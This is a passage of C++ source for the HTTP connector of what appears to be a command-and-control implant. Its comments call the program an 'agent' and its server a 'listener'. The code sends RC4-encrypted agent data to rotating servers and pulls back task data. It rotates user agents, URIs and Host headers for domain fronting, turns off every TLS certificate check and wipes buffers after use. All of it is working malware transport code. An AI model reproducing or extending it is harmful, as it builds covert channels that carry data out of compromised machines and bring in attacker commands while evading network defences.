			this->functions->LocalFree(tmpHeaders);
		}
		this->functions->InternetCloseHandle(hRequest);
		return 1684;
	}

	BOOL sent = this->functions->HttpSendRequestA(hRequest, reqHeaders, (DWORD)StrLenA(reqHeaders), NULL, 0);

	if (tmpHeaders) {
		memset(tmpHeaders, 0, StrLenA(tmpHeaders));
		this->functions->LocalFree(tmpHeaders);
	}

	this->functions->InternetCloseHandle(hRequest);

	if (!sent)
		return 1584;

	if (stage == 82 || stage == 85)
		return 1500 + stage;

	return 1599;
}

// SendData 把加密后的 agent 数据塞进 HTTP 请求并发给 listener。
void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
{
	this->recvSize = 0;
	this->recvData = 0;
	if (!this->EnsureWininetApis())
		return;

	ULONG attempt = 0;
	BOOL  connected = FALSE;
	BOOL  result = FALSE;
	DWORD context = 0;

	// Close existing handles to force new UA per call
	if (this->hConnect) {
		this->functions->InternetCloseHandle(this->hConnect);
		this->hConnect = NULL;
	}
	if (this->hInternet) {
		this->functions->InternetCloseHandle(this->hInternet);
		this->hInternet = NULL;
	}

	while (!connected && attempt < this->server_count) {
		DWORD dwError = 0;

		if (!this->hInternet) {
			CHAR* currentUA = this->user_agents[this->ua_index];
			if (this->proxy_url != NULL) {
				this->hInternet = this->functions->InternetOpenA(currentUA, INTERNET_OPEN_TYPE_PROXY, this->proxy_url, NULL, 0);
			}
			else {
				this->hInternet = this->functions->InternetOpenA(currentUA, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
			}
		}
		if (this->hInternet) {

			if (!this->hConnect)
				this->hConnect = this->functions->InternetConnectA(this->hInternet, this->server_address[this->server_index], this->server_ports[this->server_index], NULL, NULL, INTERNET_SERVICE_HTTP, 0, (DWORD_PTR)&context);

			if (this->hConnect)
			{
				CHAR acceptTypes[] = { '*', '/', '*', 0 };
				LPCSTR rgpszAcceptTypes[] = { acceptTypes, 0 };
					// Do not request a persistent HTTP connection here.  See the
					// ProbeRequestStage flag construction above for the runtime
					// symptom this avoids: first check-in succeeds, then the agent
					// remains stuck on an established socket and never polls tasks.
					DWORD flags = INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI | INTERNET_FLAG_NO_COOKIES;
				if (this->ssl)
					flags |= INTERNET_FLAG_SECURE;

				CHAR* currentUri = this->uris[this->uri_index];
				HINTERNET hRequest = this->functions->HttpOpenRequestA(this->hConnect, this->http_method, currentUri, 0, 0, rgpszAcceptTypes, flags, (DWORD_PTR)&context);
				if (hRequest) {
						if (this->ssl) {
							DWORD dwFlags = 0;
							DWORD dwBuffer = sizeof(DWORD);
							result = this->functions->InternetQueryOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, &dwBuffer);
							if (!result) {
								dwFlags = 0;
							}
							dwFlags |= SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_REVOCATION | SECURITY_FLAG_IGNORE_WRONG_USAGE;
							this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
						}
						DWORD ioTimeoutMs = 5000;
						this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_RECEIVE_TIMEOUT, &ioTimeoutMs, sizeof(ioTimeoutMs));
						this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_SEND_TIMEOUT, &ioTimeoutMs, sizeof(ioTimeoutMs));

					if (this->proxy_type != PROXY_TYPE_NONE && this->proxy_username != NULL) {
						this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_PROXY_USERNAME, this->proxy_username, StrLenA(this->proxy_username));
						if (this->proxy_password != NULL) {
							this->functions->InternetSetOptionA(hRequest, INTERNET_OPTION_PROXY_PASSWORD, this->proxy_password, StrLenA(this->proxy_password));
						}
					}

					// Build request headers with optional Host header
					CHAR* reqHeaders = this->headers;
					CHAR* tmpHeaders = NULL;
					if (this->hh_count > 0) {
						CHAR* currentHH = this->host_headers[this->hh_index];
						ULONG hhLen = StrLenA(currentHH);
						ULONG baseLen = StrLenA(this->headers);
						WORD currentPort = this->server_ports[this->server_index];

						BOOL hasPort = FALSE;
						for (ULONG i = 0; i < hhLen; i++) {
							if (currentHH[i] == ':') {
								hasPort = TRUE;
								break;
							}
						}

						BOOL needPort = FALSE;
						CHAR portStr[6] = {0};
						ULONG portLen = 0;
						if (!hasPort) {
							if ((this->ssl && currentPort != 443) || (!this->ssl && currentPort != 80)) {
								needPort = TRUE;
								WORD port = currentPort;
								if (port == 0) {
									portStr[portLen++] = '0';
								} else {
									CHAR temp[6];
									int tempIdx = 0;
									while (port > 0) {
										temp[tempIdx++] = '0' + (port % 10);
										port /= 10;
									}
									for (int i = tempIdx - 1; i >= 0; i--) {
										portStr[portLen++] = temp[i];
									}
								}
								portStr[portLen] = 0;
							}
						}

						ULONG allocSize = 6 + hhLen + (needPort ? 1 + portLen : 0) + 2 + baseLen + 1;
						tmpHeaders = (CHAR*)this->functions->LocalAlloc(LPTR, allocSize);
						ULONG off = 0;
						tmpHeaders[off++] = 'H'; tmpHeaders[off++] = 'o'; tmpHeaders[off++] = 's';
						tmpHeaders[off++] = 't'; tmpHeaders[off++] = ':'; tmpHeaders[off++] = ' ';
						memcpy(tmpHeaders + off, currentHH, hhLen); off += hhLen;
						if (needPort) {
							tmpHeaders[off++] = ':';
							memcpy(tmpHeaders + off, portStr, portLen); off += portLen;
						}
						tmpHeaders[off++] = '\r'; tmpHeaders[off++] = '\n';
						memcpy(tmpHeaders + off, this->headers, baseLen); off += baseLen;
						tmpHeaders[off] = 0;
						reqHeaders = tmpHeaders;
					}

					if (!this->EnsureHttpSendRequestA()) {
						ConnectorDiagLogU32("HTTP_SEND_RESOLVE_FAIL=", this->functions->GetLastError());
						if (tmpHeaders) {
							memset(tmpHeaders, 0, StrLenA(tmpHeaders));
							this->functions->LocalFree(tmpHeaders);
						}
						this->functions->InternetCloseHandle(hRequest);
						if (this->hConnect) {
							this->functions->InternetCloseHandle(this->hConnect);
							this->hConnect = NULL;
						}
						if (this->hInternet) {
							this->functions->InternetCloseHandle(this->hInternet);
							this->hInternet = NULL;
						}
						return;
					}

					connected = this->functions->HttpSendRequestA(hRequest, reqHeaders, (DWORD)StrLenA(reqHeaders), (LPVOID)data, (DWORD)data_size);
					if (connected)
						ConnectorDiagLog("HTTP_SEND_OK");
					else
						ConnectorDiagLogU32("HTTP_SEND_FAIL=", this->functions->GetLastError());

					if (tmpHeaders) {
						memset(tmpHeaders, 0, StrLenA(tmpHeaders));
						this->functions->LocalFree(tmpHeaders);
					}
					if (connected) {
						char statusCode[255];
						DWORD statusCodeLenght = 255;
						BOOL result = this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_STATUS_CODE, statusCode, &statusCodeLenght, 0);
						if (result)
							ConnectorDiagLogU32("HTTP_STATUS=", (ULONG)_atoi(statusCode));
						else
							ConnectorDiagLogU32("HTTP_STATUS_QUERY_FAIL=", this->functions->GetLastError());

						if (result && _atoi(statusCode) == 200) {
							DWORD answerSize = 0;
							DWORD dwLengthDataSize = sizeof(DWORD);
							result = this->functions->HttpQueryInfoA(hRequest, HTTP_QUERY_CONTENT_LENGTH | HTTP_QUERY_FLAG_NUMBER, &answerSize, &dwLengthDataSize, NULL);
							ConnectorDiagLogU32("HTTP_CONTENT_QUERY_OK=", result ? 1 : 0);

							if (result) {
								ConnectorDiagLogU32("HTTP_CONTENT_LENGTH=", answerSize);
								DWORD dwNumberOfBytesAvailable = 0;
								result = this->functions->InternetQueryDataAvailable(hRequest, &dwNumberOfBytesAvailable, 0, 0);
								if (result)
									ConnectorDiagLogU32("HTTP_AVAILABLE=", dwNumberOfBytesAvailable);
								else
									ConnectorDiagLogU32("HTTP_AVAILABLE_FAIL=", this->functions->GetLastError());

								if (result && answerSize > 0) {
									ULONG numberReadedBytes = 0;
									DWORD readedBytes = 0;
									BYTE* buffer = (BYTE*)this->functions->LocalAlloc(LPTR, answerSize);

									while (numberReadedBytes < answerSize) {
										result = this->functions->InternetReadFile(hRequest, buffer + numberReadedBytes, dwNumberOfBytesAvailable, &readedBytes);
										if (!result || !readedBytes) {
											break;
										}
										numberReadedBytes += readedBytes;
									}
									this->recvSize = numberReadedBytes;
									this->recvData = buffer;
									ConnectorDiagLogU32("HTTP_RECV_SIZE=", numberReadedBytes);
								}
							}
							else if (this->functions->GetLastError() == ERROR_HTTP_HEADER_NOT_FOUND) {
								ConnectorDiagLog("HTTP_CONTENT_LENGTH_MISSING");
								ULONG numberReadedBytes = 0;
								DWORD readedBytes = 0;
								BYTE* buffer = (BYTE*)this->functions->LocalAlloc(LPTR, 0);
								DWORD dwNumberOfBytesAvailable = 0;

								while (1) {
									result = this->functions->InternetQueryDataAvailable(hRequest, &dwNumberOfBytesAvailable, 0, 0);
									if (!result || !dwNumberOfBytesAvailable)
										break;

									buffer = (BYTE*)this->functions->LocalReAlloc(buffer, dwNumberOfBytesAvailable + numberReadedBytes, LMEM_MOVEABLE);
									result = this->functions->InternetReadFile(hRequest, buffer + numberReadedBytes, dwNumberOfBytesAvailable, &readedBytes);
									if (!result || !readedBytes) {
										break;
									}
									numberReadedBytes += readedBytes;
								}

								if (numberReadedBytes) {
									this->recvSize = numberReadedBytes;
									this->recvData = buffer;
									ConnectorDiagLogU32("HTTP_RECV_SIZE=", numberReadedBytes);
								}
								else {
									this->functions->LocalFree(buffer);
								}
							}
						}
					}
					else {
						dwError = this->functions->GetLastError();
					}
					this->functions->InternetCloseHandle(hRequest);
				}
			}

			attempt++;
			if (!connected) {
				if (this->hConnect) {
					this->functions->InternetCloseHandle(this->hConnect);
					this->hConnect = NULL;
				}
				if (this->hInternet) {
					this->functions->InternetCloseHandle(this->hInternet);
					this->hInternet = NULL;
				}

				this->functions->InternetSetOptionA(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
				this->functions->InternetSetOptionA(NULL, INTERNET_OPTION_REFRESH, NULL, 0);

				this->server_index = (this->server_index + 1) % this->server_count;
			}

			// Rotate indices for next callback (active round-robin)
			if (this->rotation_mode == 1) {
				this->uri_index = GenerateRandom32() % this->uri_count;
				this->ua_index = GenerateRandom32() % this->ua_count;
				this->server_index = GenerateRandom32() % this->server_count;
				if (this->hh_count > 0)
					this->hh_index = GenerateRandom32() % this->hh_count;
			}
			else {
				this->uri_index = (this->uri_index + 1) % this->uri_count;
				this->ua_index = (this->ua_index + 1) % this->ua_count;
				this->server_index = (this->server_index + 1) % this->server_count;
				if (this->hh_count > 0)
					this->hh_index = (this->hh_index + 1) % this->hh_count;
			}
		}
	}
}

// RecvData 返回上一次 HTTP 响应里收到的任务数据。
BYTE* ConnectorHTTP::RecvData()
{
	if (this->recvData)
		return this->recvData + this->ans_pre_size;
	else
		return NULL;
}

// RecvSize 返回当前接收缓冲区里有效数据的大小。
int ConnectorHTTP::RecvSize()
{
	if (this->recvSize < this->ans_size)
		return 0;

	return this->recvSize - this->ans_size;
}

// RecvClear 清空接收缓冲区，避免旧任务被重复处理。
void ConnectorHTTP::RecvClear()
{
	if (this->recvData && this->recvSize) {
		memset(this->recvData, 0, this->recvSize);
		this->functions->LocalFree(this->recvData);
		this->recvData = NULL;
	}
}

// Exchange 完成一次完整通信：加密、发送 HTTP 请求、接收响应并解密。
void ConnectorHTTP::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
{
	if (plainData && plainSize > 0) {
		EncryptRC4(plainData, plainSize, sessionKey, 16);
		this->SendData(plainData, plainSize);
	}
	else {
		this->SendData(NULL, 0);
	}

	if (this->recvSize > 0 && this->recvData) {
		int dataSize = this->RecvSize();
		BYTE* dataPtr = this->RecvData();
		if (dataSize > 0 && dataPtr)
			DecryptRC4(dataPtr, dataSize, sessionKey, 16);
	}
}

// CloseConnector 关闭 HTTP 连接器，目前主要作为接口占位。
void ConnectorHTTP::CloseConnector()
{
	DWORD l = StrLenA(this->headers);
	memset(this->headers, 0, l);
	this->functions->LocalFree(this->headers);
	this->headers = NULL;

	this->functions->InternetCloseHandle(this->hInternet);
	this->functions->InternetCloseHandle(this->hConnect);
}
